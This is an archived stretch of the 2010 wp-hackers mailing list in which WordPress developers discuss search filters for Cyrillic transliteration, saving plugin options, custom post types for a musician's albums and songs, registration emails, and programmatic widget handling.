	<AANLkTi=JLpzgp5br6p09VONFacOEQxji9eLLovqSnHmo@mail.gmail.com>
	<AANLkTinup-uVa7sH_ukb4LdAbb11LHSvP9nGrZTp4GQ2@mail.gmail.com>
	<AANLkTik8ufXFhG+UMH+H4xcs=ZjLuupGz+4DhejwbE=A@mail.gmail.com>
Message-ID: <AANLkTikYaJHdqPcEeDzv-LVXgeb0JLoKosynottAJPRn@mail.gmail.com>

Since my issues would be titled same, I'll post it here.

I want to format search term in usage specific for Serbian language.There is
issue when posts are written in Cyrillic script and user searches with
Latin, they don't get any result although there is probably result with that
term transliterated in Cyrillic.

So what we need is to transliterate that search term and that search for it
too. I used code from plugin Search Everything to get to version of possible
solution: one that use straight PHP transliteration (PHP transliteration
from Latin to Cyrillic can have bad results, depending on term), and Google
Transliteration. (see
http://sr.forums.wordpress.org/topic/cirilicna-pretraga-u-wordpressu#post-994
 )

Both solutions work but with some big problems:
1) search also includes drafts, revisions, and probably private posts
2) if custom menus are used, they are completely broken (menus contain
search results)
3) searching for a phrase (like "my search") doesn't work; I don't get how
this actually works in WordPress

So any suggestion at how this code can be improved or even usage of any
other hook?

Thanks in advance

2010/9/16 Tom Jenkins <tom at thejenkinsweb.com>

> So why not just highjack the post method through javascript, make your
> changes, then forward the post method onto wordpress?
>
>
> Tom
>
>
> On Wed, Sep 15, 2010 at 5:12 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > It doesn't look like that filter is what i need.  I want to capture the
> > search query before anything is done with it to change it, not while its
> > doing some queries to find results for the search.
> > On Wed, Sep 15, 2010 at 1:22 PM, scribu <scribu at gmail.com> wrote:
> >
> > > On Wed, Sep 15, 2010 at 9:28 PM, Ryan Bilesky <rbilesky at gmail.com>
> > wrote:
> > >
> > > > Best i can find this is a really new filter, only since 3.0 and I
> can't
> > > > seem
> > > > to figure out how to get it working.  I setup a simple example on my
> > demo
> > > > install of WP.  I had my filter function return Hello World and
> > searched
> > > > something else that didn't yield any results.  Hello world should
> give
> > > the
> > > > the initial hello world post, i get nothing.
> > > >
> > >
> > > You should look at what the filter expects first, before returning
> > > something
> > > else:
> > >
> > > function my_posts_search( $sql ) {
> > >  var_dump( $sql );
> > >  return $sql;
> > > }
> > >
> > > add_filter( 'posts_search', 'my_posts_search' );
> > >
> > >
> > > --
> > >  http://scribu.net
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From johnbillion+wp at gmail.com  Mon Oct 18 18:11:28 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 18 Oct 2010 19:11:28 +0100
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
	<AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
Message-ID: <AANLkTimMEkNtd3bramvM0OFmfE-kt+sfJV_Bw9N0RNzJ@mail.gmail.com>

On Mon, Oct 18, 2010 at 6:53 PM, Otto <otto at ottodestruct.com> wrote:
> Might be simplest to just pull out the existing array then
> update it with the incoming options instead.

^ A much better solution.

From joshua.sibelman at gmail.com  Mon Oct 18 18:37:07 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Mon, 18 Oct 2010 11:37:07 -0700
Subject: [wp-hackers] Direction for custom taxonomy/post types
Message-ID: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>

Hi all,

Forgive the length and noobishness of the following, but I've been trying to wrap my head around how best to approach a custom WP implementation and am at an impasse.

I'm working on a site for a musician who's had a long career. I'm wanting to store his albums, navigable by year, and the songs on those albums.

The album needs to have a fair amount of data with it: title, cover art, description, photo gallery, in addition to its songs.

The songs also need to have data with them: credits, lyrics, media file - and they must be browsable on their own, as in the future he may move to only doing song releases and not albums.

My initial thinking was to do custom post types, but that's starting to seem overly complex and not really workable. I'm considering just doing a custom plugin with my own database tables instead.

The resources I've been able to find on working with custom taxonomies are sparse at best - does it seem to make sense to do what I'm wanting as a plugin? Or does it seem suited to using custom post types and custom taxonomies? If the latter, are there good resources available for working with these? Most of what I've seen out there for WP is geared towards very basic implementations.

Thanks in advance for any help or insight anyone can give me.

Cheers,
Josh

From otto at ottodestruct.com  Mon Oct 18 18:49:35 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 18 Oct 2010 13:49:35 -0500
Subject: [wp-hackers] Direction for custom taxonomy/post types
In-Reply-To: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>
References: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>
Message-ID: <AANLkTimXuyXM_oSEg==8RBBeFL6=x31Jq7CCf=rKTPm6@mail.gmail.com>

I'd do it with custom post types and a single custom taxonomy.

First, I'd make an album post type. This would have the main fields be
used (title would be name of the album, content would be the
description, etc). All the extra data would be custom meta data. You
could use a custom meta plugin for that or just the custom fields.
Cover art would be the featured thumbnail. That sort of thing.

There would be a custom taxonomy for album too, and the name of the
album (with possibly additional data like the year or something to
handle cases where there's more than one album of the same name) would
be added as a term to that album post.

Then I'd make a song post type, which did much the same for songs. To
include the song in the album, you'd give it that same custom term in
the album taxonomy. Thus a taxonomy query on the song post type would
be able to give you all the songs in the album easily.


But what you're looking at is indeed a fair amount of custom code
though, and it'd have to be done by an experienced WordPress coder.
Note that plugins tend to be generic, geared towards the widest
possible audience. When you want to do something very specific and
custom to your needs, then you're going to probably be the one coding
it or paying somebody else to code it. It's generally unlikely to find
a plugin that is an "exact fit" to your needs when the need is so
custom. You could probably hack something together with plugins, but
it will be what it is: an imperfect fit that you made work. It won't
fit your needs precisely because you have very precise needs.

-Otto



On Mon, Oct 18, 2010 at 1:37 PM, Joshua Sibelman
<joshua.sibelman at gmail.com> wrote:
> Hi all,
>
> Forgive the length and noobishness of the following, but I've been trying to wrap my head around how best to approach a custom WP implementation and am at an impasse.
>
> I'm working on a site for a musician who's had a long career. I'm wanting to store his albums, navigable by year, and the songs on those albums.
>
> The album needs to have a fair amount of data with it: title, cover art, description, photo gallery, in addition to its songs.
>
> The songs also need to have data with them: credits, lyrics, media file - and they must be browsable on their own, as in the future he may move to only doing song releases and not albums.
>
> My initial thinking was to do custom post types, but that's starting to seem overly complex and not really workable. I'm considering just doing a custom plugin with my own database tables instead.
>
> The resources I've been able to find on working with custom taxonomies are sparse at best - does it seem to make sense to do what I'm wanting as a plugin? Or does it seem suited to using custom post types and custom taxonomies? If the latter, are there good resources available for working with these? Most of what I've seen out there for WP is geared towards very basic implementations.
>
> Thanks in advance for any help or insight anyone can give me.
>
> Cheers,
> Josh
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From joshua.sibelman at gmail.com  Mon Oct 18 19:16:09 2010
From: joshua.sibelman at gmail.com (Joshua Sibelman)
Date: Mon, 18 Oct 2010 12:16:09 -0700
Subject: [wp-hackers] Direction for custom taxonomy/post types
In-Reply-To: <AANLkTimXuyXM_oSEg==8RBBeFL6=x31Jq7CCf=rKTPm6@mail.gmail.com>
References: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>
	<AANLkTimXuyXM_oSEg==8RBBeFL6=x31Jq7CCf=rKTPm6@mail.gmail.com>
Message-ID: <12E3F2E8-5149-4EFA-9F67-02E9354E2F59@gmail.com>

Thanks for the detailed response.

The reason I was thinking a custom plugin was because that seems to be a good way to hook into WP actions, while offering the ability to define custom Admin panels for my client to be able to manage all this content. Where the idea of the plugin deters me is that I'd love to be able to use things that come pre-built with the existing WP post functionality like images, date sorting, etc.

I wasn't thinking in terms of a plugin to be released to the wild, but one specifically for this client and this job.

In a nutshell, I'm seeing the plugin route as a way to operate outside the constraints of WordPress' plugin and taxonomy system.

Does that make sense?



On Oct 18, 2010, at 11:49 AM, Otto wrote:

> I'd do it with custom post types and a single custom taxonomy.
> 
> First, I'd make an album post type. This would have the main fields be
> used (title would be name of the album, content would be the
> description, etc). All the extra data would be custom meta data. You
> could use a custom meta plugin for that or just the custom fields.
> Cover art would be the featured thumbnail. That sort of thing.
> 
> There would be a custom taxonomy for album too, and the name of the
> album (with possibly additional data like the year or something to
> handle cases where there's more than one album of the same name) would
> be added as a term to that album post.
> 
> Then I'd make a song post type, which did much the same for songs. To
> include the song in the album, you'd give it that same custom term in
> the album taxonomy. Thus a taxonomy query on the song post type would
> be able to give you all the songs in the album easily.
> 
> 
> But what you're looking at is indeed a fair amount of custom code
> though, and it'd have to be done by an experienced WordPress coder.
> Note that plugins tend to be generic, geared towards the widest
> possible audience. When you want to do something very specific and
> custom to your needs, then you're going to probably be the one coding
> it or paying somebody else to code it. It's generally unlikely to find
> a plugin that is an "exact fit" to your needs when the need is so
> custom. You could probably hack something together with plugins, but
> it will be what it is: an imperfect fit that you made work. It won't
> fit your needs precisely because you have very precise needs.
> 
> -Otto
> 
> 
> 
> On Mon, Oct 18, 2010 at 1:37 PM, Joshua Sibelman
> <joshua.sibelman at gmail.com> wrote:
>> Hi all,
>> 
>> Forgive the length and noobishness of the following, but I've been trying to wrap my head around how best to approach a custom WP implementation and am at an impasse.
>> 
>> I'm working on a site for a musician who's had a long career. I'm wanting to store his albums, navigable by year, and the songs on those albums.
>> 
>> The album needs to have a fair amount of data with it: title, cover art, description, photo gallery, in addition to its songs.
>> 
>> The songs also need to have data with them: credits, lyrics, media file - and they must be browsable on their own, as in the future he may move to only doing song releases and not albums.
>> 
>> My initial thinking was to do custom post types, but that's starting to seem overly complex and not really workable. I'm considering just doing a custom plugin with my own database tables instead.
>> 
>> The resources I've been able to find on working with custom taxonomies are sparse at best - does it seem to make sense to do what I'm wanting as a plugin? Or does it seem suited to using custom post types and custom taxonomies? If the latter, are there good resources available for working with these? Most of what I've seen out there for WP is geared towards very basic implementations.
>> 
>> Thanks in advance for any help or insight anyone can give me.
>> 
>> Cheers,
>> Josh
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From gaarai at gaarai.com  Mon Oct 18 19:17:58 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 18 Oct 2010 14:17:58 -0500
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
	<AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
Message-ID: <4CBC9D66.5070401@gaarai.com>

Keep in mind that if you have any checkboxes in your form, that 
unchecked checkbox variables will be missing from the $_POST variable 
(or however else your code checks it). So, if you find that your 
checkbox is always checked after being saved in a checked state, you 
will have to manually confirm the absence of checkbox variables and 
manually set that variable to an off state (unset its position in the 
array, set it to blank, etc).

For example:

$settings = get_option( 'option_name' );
$settings = array_merge( $settings, $_POST );

if ( ! isset( $_POST['checkbox_name'] ) )
     $settings['checkbox_name'] = '';

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/18/2010 12:53 PM, Otto wrote:
> You don't need to include it as a hidden field, just remember that
> your callback function has to return the entire array. It's going
> straight into the database from there. So make sure you pull any
> options you want to preserve out of the DB and put them in the new
> array. Might be simplest to just pull out the existing array then
> update it with the incoming options instead.
>
> -Otto

From sbressler at gmail.com  Mon Oct 18 19:27:54 2010
From: sbressler at gmail.com (Scott Bressler)
Date: Mon, 18 Oct 2010 12:27:54 -0700
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <4CBC9D66.5070401@gaarai.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
	<AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
	<4CBC9D66.5070401@gaarai.com>
Message-ID: <AANLkTimOxEL5Cj069bc5QJzOMEYULoBuB_uBV-meA7kS@mail.gmail.com>

Hmm, well, this would be in the sanitization callback, right? So it'd be
array_merge with the passed parameter. Otherwise, makes sense. I've actually
always just written my code with array_key_exists for checkboxes, but it
definitely does make more sense to just set to 0 if missing.

On Mon, Oct 18, 2010 at 12:17 PM, Chris Jean <gaarai at gaarai.com> wrote:

> Keep in mind that if you have any checkboxes in your form, that unchecked
> checkbox variables will be missing from the $_POST variable (or however else
> your code checks it). So, if you find that your checkbox is always checked
> after being saved in a checked state, you will have to manually confirm the
> absence of checkbox variables and manually set that variable to an off state
> (unset its position in the array, set it to blank, etc).
>
> For example:
>
> $settings = get_option( 'option_name' );
> $settings = array_merge( $settings, $_POST );
>
> if ( ! isset( $_POST['checkbox_name'] ) )
>    $settings['checkbox_name'] = '';
>
> Chris Jean (AKA gaarai&  chrisbliss18)
> Coder for http://ithemes.com/
> http://gaarai.com/
> @chrisjean
>
>
>
> On 10/18/2010 12:53 PM, Otto wrote:
>
>> You don't need to include it as a hidden field, just remember that
>> your callback function has to return the entire array. It's going
>> straight into the database from there. So make sure you pull any
>> options you want to preserve out of the DB and put them in the new
>> array. Might be simplest to just pull out the existing array then
>> update it with the incoming options instead.
>>
>> -Otto
>>
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Mon Oct 18 20:02:24 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 18 Oct 2010 16:02:24 -0400
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTimOxEL5Cj069bc5QJzOMEYULoBuB_uBV-meA7kS@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
	<AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>
	<4CBC9D66.5070401@gaarai.com>
	<AANLkTimOxEL5Cj069bc5QJzOMEYULoBuB_uBV-meA7kS@mail.gmail.com>
Message-ID: <AANLkTi=SGU6TPVxOce59wW1rGseQt3rugtghJkpv_1ex@mail.gmail.com>

Easiest way to do checkboxes is this:

$am_I_checked = ! empty( $_POST['checkbox'] );

I would avoid merging in arrays as things can sneak by. The sanitization
callback receives an array. Then build a second array key by key and return
that.

Nacin

From mail at scribu.net  Mon Oct 18 20:15:31 2010
From: mail at scribu.net (scribu)
Date: Mon, 18 Oct 2010 23:15:31 +0300
Subject: [wp-hackers] Direction for custom taxonomy/post types
In-Reply-To: <12E3F2E8-5149-4EFA-9F67-02E9354E2F59@gmail.com>
References: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>
	<AANLkTimXuyXM_oSEg==8RBBeFL6=x31Jq7CCf=rKTPm6@mail.gmail.com>
	<12E3F2E8-5149-4EFA-9F67-02E9354E2F59@gmail.com>
Message-ID: <AANLkTimOpkobj9FUtnUW_=3G9YrrTCTmrOD5p3ZswiF-@mail.gmail.com>

On Mon, Oct 18, 2010 at 10:16 PM, Joshua Sibelman <joshua.sibelman at gmail.com
> wrote:

> The reason I was thinking a custom plugin was because that seems to be a
> good way to hook into WP actions, while offering the ability to define
> custom Admin panels for my client to be able to manage all this content.
> Where the idea of the plugin deters me is that I'd love to be able to use
> things that come pre-built with the existing WP post functionality like
> images, date sorting, etc.
>

With a custom post type, you can replace none, some or all of the elements
that come with the default post editing admin panel, so creating your own
data type just for this sounds like reinventing the wheel.See the 'supports'
and 'register_meta_box_cb' arguments for register_post_type():
http://codex.wordpress.org/Function_Reference/register_post_type

Also, note that you can use hooks just as well directly from the theme.

The tricky part would be connecting songs to albums. I have a plugin for
that; it's called Posts 2 Posts <http://scribu.net/wordpress/posts-to-posts>
.

From mail at scribu.net  Mon Oct 18 20:22:56 2010
From: mail at scribu.net (scribu)
Date: Mon, 18 Oct 2010 23:22:56 +0300
Subject: [wp-hackers] Filter search query before execution
In-Reply-To: <AANLkTikYaJHdqPcEeDzv-LVXgeb0JLoKosynottAJPRn@mail.gmail.com>
References: <AANLkTimqJCyfX2RG-TUhpY68beewX1w=4YjBYqELsS0v@mail.gmail.com>
	<AANLkTi=5qmq3OCbx14ier8ASj-HoZjW0THhvd9G4_g1k@mail.gmail.com>
	<AANLkTikwYs_rwuYnJ_Hs1Zbqdqt4i1ByddMa_HSdX4RD@mail.gmail.com>
	<AANLkTi=JLpzgp5br6p09VONFacOEQxji9eLLovqSnHmo@mail.gmail.com>
	<AANLkTinup-uVa7sH_ukb4LdAbb11LHSvP9nGrZTp4GQ2@mail.gmail.com>
	<AANLkTik8ufXFhG+UMH+H4xcs=ZjLuupGz+4DhejwbE=A@mail.gmail.com>
	<AANLkTikYaJHdqPcEeDzv-LVXgeb0JLoKosynottAJPRn@mail.gmail.com>
Message-ID: <AANLkTin0xBXuj20HTXHLm8VJxh1kAFBhiAiDFijgPxqm@mail.gmail.com>

On Mon, Oct 18, 2010 at 8:53 PM, Milan Dini? <liste at srpski.biz> wrote:

> 2) if custom menus are used, they are completely broken (menus contain
> search results)
>

Instead of:

function md_lattocyr_search_filter($search) {
  global $wp_query

  // rest of code here
}

add_filter('posts_search', 'md_lattocyr_search_filter');

write:

function md_lattocyr_search_filter($search, $wp_query) {
  if ( $GLOBALS['wp_query'] !== $wp_query )
    return $search;

  // rest of code here
}

add_filter('posts_search', 'md_lattocyr_search_filter', 10, 2);

From gaarai at gaarai.com  Mon Oct 18 20:24:52 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 18 Oct 2010 15:24:52 -0500
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTimOxEL5Cj069bc5QJzOMEYULoBuB_uBV-meA7kS@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>	<AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>	<4CBC9D66.5070401@gaarai.com>
	<AANLkTimOxEL5Cj069bc5QJzOMEYULoBuB_uBV-meA7kS@mail.gmail.com>
Message-ID: <4CBCAD14.1070201@gaarai.com>

I should have clarified that my example wasn't meant to be best practice 
for everything. Just a very terse example of what I meant by checking 
for the existence or absence of a checkbox variable given context with 
some additional code.

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/18/2010 02:27 PM, Scott Bressler wrote:
> Hmm, well, this would be in the sanitization callback, right? So it'd be
> array_merge with the passed parameter. Otherwise, makes sense. I've actually
> always just written my code with array_key_exists for checkboxes, but it
> definitely does make more sense to just set to 0 if missing.

From goldenapplesdesign at gmail.com  Mon Oct 18 20:25:13 2010
From: goldenapplesdesign at gmail.com (Nathaniel Taintor)
Date: Mon, 18 Oct 2010 13:25:13 -0700
Subject: [wp-hackers] Direction for custom taxonomy/post types
In-Reply-To: <AANLkTimOpkobj9FUtnUW_=3G9YrrTCTmrOD5p3ZswiF-@mail.gmail.com>
References: <A4DB3339-9164-4FF6-A6DB-07A0275F1C9D@gmail.com>
	<AANLkTimXuyXM_oSEg==8RBBeFL6=x31Jq7CCf=rKTPm6@mail.gmail.com>
	<12E3F2E8-5149-4EFA-9F67-02E9354E2F59@gmail.com>
	<AANLkTimOpkobj9FUtnUW_=3G9YrrTCTmrOD5p3ZswiF-@mail.gmail.com>
Message-ID: <AANLkTimvwVQDn-vxBGS95ddr9OLYtkgOQcgPnZNm_rF+@mail.gmail.com>

I think there's a confusion of terms here. It sounds like the question you
have is whether to use custom post types with custom taxonomies, or add new
tables to the database. Using custom post types for albums and songs,
connected via a shared taxonomy - or better - using scribu's plugin, allows
you to use a lot more of WordPress built-in API functions than you would be
able to if you reinvented the wheel by creating your own tables and
developing all of the query functions to access them. So that seems like the
best way to structure your site.

Whether you create these post types through a plugin or through your theme's
functions is entirely a matter of personal preference, and I don't see any
reason why one would be preferable to the other. Plugins are typically used
for functions that may need to be enabled or disabled, or need to be easily
installed on another site, so the easiest way to build what you're looking
for is to add the functions you want to your theme's functions.php file, or
to build a child theme with these functions in its functions.php file if
you're working off of a pre-made theme.


Nathaniel Taintor, Designer/Developer
*Golden Apples Design*
http://goldenapplesdesign.com

@GoldenApples | 503.877.2880
goldenapplesdesign at gmail.com



On Mon, Oct 18, 2010 at 1:15 PM, scribu <mail at scribu.net> wrote:

> On Mon, Oct 18, 2010 at 10:16 PM, Joshua Sibelman <
> joshua.sibelman at gmail.com
> > wrote:
>
> > The reason I was thinking a custom plugin was because that seems to be a
> > good way to hook into WP actions, while offering the ability to define
> > custom Admin panels for my client to be able to manage all this content.
> > Where the idea of the plugin deters me is that I'd love to be able to use
> > things that come pre-built with the existing WP post functionality like
> > images, date sorting, etc.
> >
>
> With a custom post type, you can replace none, some or all of the elements
> that come with the default post editing admin panel, so creating your own
> data type just for this sounds like reinventing the wheel.See the
> 'supports'
> and 'register_meta_box_cb' arguments for register_post_type():
> http://codex.wordpress.org/Function_Reference/register_post_type
>
> Also, note that you can use hooks just as well directly from the theme.
>
> The tricky part would be connecting songs to albums. I have a plugin for
> that; it's called Posts 2 Posts <
> http://scribu.net/wordpress/posts-to-posts>
> .
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From liste at srpski.biz  Mon Oct 18 20:53:12 2010
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Mon, 18 Oct 2010 22:53:12 +0200
Subject: [wp-hackers] Filter search query before execution
In-Reply-To: <AANLkTin0xBXuj20HTXHLm8VJxh1kAFBhiAiDFijgPxqm@mail.gmail.com>
References: <AANLkTimqJCyfX2RG-TUhpY68beewX1w=4YjBYqELsS0v@mail.gmail.com>
	<AANLkTi=5qmq3OCbx14ier8ASj-HoZjW0THhvd9G4_g1k@mail.gmail.com>
	<AANLkTikwYs_rwuYnJ_Hs1Zbqdqt4i1ByddMa_HSdX4RD@mail.gmail.com>
	<AANLkTi=JLpzgp5br6p09VONFacOEQxji9eLLovqSnHmo@mail.gmail.com>
	<AANLkTinup-uVa7sH_ukb4LdAbb11LHSvP9nGrZTp4GQ2@mail.gmail.com>
	<AANLkTik8ufXFhG+UMH+H4xcs=ZjLuupGz+4DhejwbE=A@mail.gmail.com>
	<AANLkTikYaJHdqPcEeDzv-LVXgeb0JLoKosynottAJPRn@mail.gmail.com>
	<AANLkTin0xBXuj20HTXHLm8VJxh1kAFBhiAiDFijgPxqm@mail.gmail.com>
Message-ID: <AANLkTi=BVDMZeae2erYQyUCP18Gp8G3c-gC+B22LR-g-@mail.gmail.com>

Thanks, this solves issue with menus.


2010/10/18 scribu <mail at scribu.net>

> On Mon, Oct 18, 2010 at 8:53 PM, Milan Dini? <liste at srpski.biz> wrote:
>
> > 2) if custom menus are used, they are completely broken (menus contain
> > search results)
> >
>
> Instead of:
>
> function md_lattocyr_search_filter($search) {
>  global $wp_query
>
>  // rest of code here
> }
>
> add_filter('posts_search', 'md_lattocyr_search_filter');
>
> write:
>
> function md_lattocyr_search_filter($search, $wp_query) {
>  if ( $GLOBALS['wp_query'] !== $wp_query )
>    return $search;
>
>  // rest of code here
> }
>
> add_filter('posts_search', 'md_lattocyr_search_filter', 10, 2);
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From andrew at graymerica.com  Tue Oct 19 02:10:34 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Mon, 18 Oct 2010 22:10:34 -0400
Subject: [wp-hackers] how do I stop the admin user from getting emails for
	every new user or password reset
Message-ID: <B1C235A0-B4EF-4220-A2C2-FE466EFE6419@graymerica.com>

I was wondering if anyone has an action or filter to eliminate a new email on every new user being sent to the admin user

I am getting hundreds of them,

here is what I found on the wordpress.org:  http://wordpress.org/support/topic/how-to-stop-email-notification-of-new-registrations

Is there an easy way to eliminate this, other than putting in a fake email address,

thanks,

Andrew

From otto at ottodestruct.com  Tue Oct 19 02:23:35 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 18 Oct 2010 21:23:35 -0500
Subject: [wp-hackers] how do I stop the admin user from getting emails
 for every new user or password reset
In-Reply-To: <B1C235A0-B4EF-4220-A2C2-FE466EFE6419@graymerica.com>
References: <B1C235A0-B4EF-4220-A2C2-FE466EFE6419@graymerica.com>
Message-ID: <AANLkTikwLWix5pv4Y0_Tksc0Zc48t75dFucB1aRFjdfL@mail.gmail.com>

http://wordpress.org/extend/plugins/disable-registration-email/

-Otto



On Mon, Oct 18, 2010 at 9:10 PM, Andrew Gray <andrew at graymerica.com> wrote:
> I was wondering if anyone has an action or filter to eliminate a new email on every new user being sent to the admin user
>
> I am getting hundreds of them,
>
> here is what I found on the wordpress.org: ?http://wordpress.org/support/topic/how-to-stop-email-notification-of-new-registrations
>
> Is there an easy way to eliminate this, other than putting in a fake email address,
>
> thanks,
>
> Andrew
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Martin.Widmann at medienhaus.com  Tue Oct 19 06:31:48 2010
From: Martin.Widmann at medienhaus.com (Martin Widmann)
Date: Tue, 19 Oct 2010 06:31:48 +0000
Subject: [wp-hackers] Programmatic Widget Handling
Message-ID: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>

Hi,

I'm currently working on an extension to the widget's functionality to allow users of the site to create virtually unlimited amounts of new sidebars, filter them and add widgets to them. As long as it's sidebars it's pretty straight forward. 

- register Sidebar
- Store sidebar settings in options
- when init fires, re-create the stored sidebars 

Having many sidebars in many configurations calls for an import/export functionality. And this is where it gets tricky. I haven't found a good way of adding/removing widgets programmatically. It all seems to get done via rewriting parameters in the POST and than calling back various methods on WP_Widget. Trying to reverse engineer this functionality added the widgets to the database in some "invisible" space, but not to the sidebar I wanted.

Therefore I decided to go the hard way and do the operations on the simple serialized arrays stored in the database:

- sidebars can either be overwritten or not if they exist on destination
- check if all the widgets used on the sidebar to import are available on the destination
- reset the sidebar's widgets in $sidebars_widgets - I'm not going to delete the old widgets as I fear this could turn out in a mess
- iterate over the new to assign widgets. The numeric value that identifies the instance is get from an internal array that initializes with the value of $wp_widget_factory->widget[ $widget_class ]->number and then gets incremented internally.
- push the widget's settings into the unserialized value of option widget_$id_base also gotten from $wp_widget_factory and update the option.
- once all widgets for the sidebar are done, I update the sidebars_widgets option and go over to the next sidebar.

I'm not sure if I covered all ends and if there's a simpler way of doing this. I also fear that this solution might break in a future version of WordPress. What do you think?

BR,
Martin

From peter.westwood at ftwr.co.uk  Tue Oct 19 09:04:17 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 19 Oct 2010 10:04:17 +0100
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
Message-ID: <94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>

Hi Martin,

On 19 Oct 2010, at 07:31, Martin Widmann wrote:

> I'm currently working on an extension to the widget's functionality to allow users of the site to create virtually unlimited amounts of new sidebars, filter them and add widgets to them. As long as it's sidebars it's pretty straight forward. 
> 
> - register Sidebar
> - Store sidebar settings in options
> - when init fires, re-create the stored sidebars 
> 
> Having many sidebars in many configurations calls for an import/export functionality. And this is where it gets tricky. I haven't found a good way of adding/removing widgets programmatically. It all seems to get done via rewriting parameters in the POST and than calling back various methods on WP_Widget. Trying to reverse engineer this functionality added the widgets to the database in some "invisible" space, but not to the sidebar I wanted.
> 
> Therefore I decided to go the hard way and do the operations on the simple serialized arrays stored in the database:
> 
> - sidebars can either be overwritten or not if they exist on destination
